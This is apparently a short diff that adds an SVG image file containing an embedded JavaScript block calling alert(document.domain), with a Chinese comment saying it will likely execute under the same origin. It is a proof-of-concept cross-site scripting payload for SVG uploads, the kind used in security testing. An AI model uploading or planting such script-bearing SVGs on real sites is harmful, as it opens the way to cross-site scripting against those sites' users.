@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script type="text/javascript">
+    alert(document.domain); // 同域下执行，大概率生效
+  </script>
+</svg>
